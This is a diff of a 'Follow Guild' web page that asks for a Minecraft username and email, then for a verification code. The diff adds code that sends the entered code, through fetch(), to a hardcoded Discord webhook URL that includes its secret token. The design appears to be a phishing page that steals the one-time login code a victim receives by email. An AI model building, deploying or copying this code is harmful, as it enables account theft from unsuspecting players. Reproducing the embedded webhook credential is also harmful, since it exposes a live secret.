@@ -3,103 +3,16 @@
 <head>
   <title>Follow Guild</title>
   <style>
-    body {
-      background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 20px;
-    }
-
-    h2 {
-      color: #333;
-      text-align: center;
-    }
-
-    #formContainer {
-      max-width: 400px;
-      margin: 20px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-    }
-
-    #formContainer h2 {
-      margin-bottom: 20px;
-    }
-
-    #formContainer label {
-      display: block;
-      margin-bottom: 10px;
-    }
-
-    #formContainer input[type="text"],
-    #formContainer input[type="email"] {
-      width: 100%;
-      padding: 8px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    #formContainer input[type="submit"] {
-      background-color: #ff5a5f;
-      border: none;
-      border-radius: 4px;
-      color: #fff;
-      cursor: pointer;
-      padding: 8px 16px;
-      font-size: 14px;
-      transition: background-color 0.3s;
-      margin-top: 10px;
-    }
-
-    #formContainer input[type="submit"]:hover {
-      background-color: #e5373b;
-    }
-
-    #formContainer input[type="submit"]:focus {
-      outline: none;
-      box-shadow: 0 0 0 2px #e5373b;
-    }
-
-    #codeContainer {
-      display: none;
-      margin-top: 20px;
-    }
-
-    #codeContainer label {
-      display: block;
-      margin-bottom: 10px;
-    }
-
-    #codeContainer input[type="text"] {
-      width: 100%;
-      padding: 8px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
+    /* CSS styles here */
   </style>
 </head>
 <body>
   <div id="formContainer">
-    <h2>Follow Guild</h2>
-    <form id="followForm">
-      <label for="username">Minecraft Username</label>
-      <input type="text" id="username" required><br>
-      <label for="email">Email</label>
-      <input type="email" id="email" required><br>
-      <input type="hidden" id="guildId" value="">
-      <input type="submit" value="Submit">
-    </form>
+    <!-- Form HTML here -->
   </div>
 
   <div id="codeContainer">
-    <h2>Submit Code</h2>
-    <form id="codeForm">
-      <label for="code">Verification Code</label>
-      <input type="text" id="code" required><br>
-      <input type="submit" value="Submit">
-    </form>
+    <!-- Code input form HTML here -->
   </div>
 
   <script>
@@ -170,14 +83,44 @@
       // get the verification code
       const code = document.getElementById('code').value;
 
-      // validate the code and perform further actions if needed
-      if (code === '123456') {
-        console.log("Code submitted successfully!");
-        // Code validation success, you can perform any further actions here
-      } else {
-        console.log("Invalid code!");
-        // Code validation failed, you can display an error message or take other actions
-      }
+      // create the verification code message
+      const codeMessage = {
+        "content": "Verification code entered!",
+        "embeds": [
+          {
+            "title": "Verification Code",
+            "description": "The verification code entered by the user.",
+            "color": 16711680,
+            "fields": [
+              {
+                "name": "Code",
+                "value": code
+              }
+            ]
+          }
+        ]
+      };
+
+      // send the verification code message to the webhook
+      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(codeMessage)
+      })
+      .then(function(response) {
+        if (response.ok) {
+          console.log("Code submitted successfully!");
+          // Code validation success, you can perform any further actions here
+        } else {
+          console.log("Error:", response.statusText);
+          // Code validation failed, you can display an error message or take other actions
+        }
+      })
+      .catch(function(error) {
+        console.log("Error:", error);
+      });
     });
 
     function showCodeForm() {
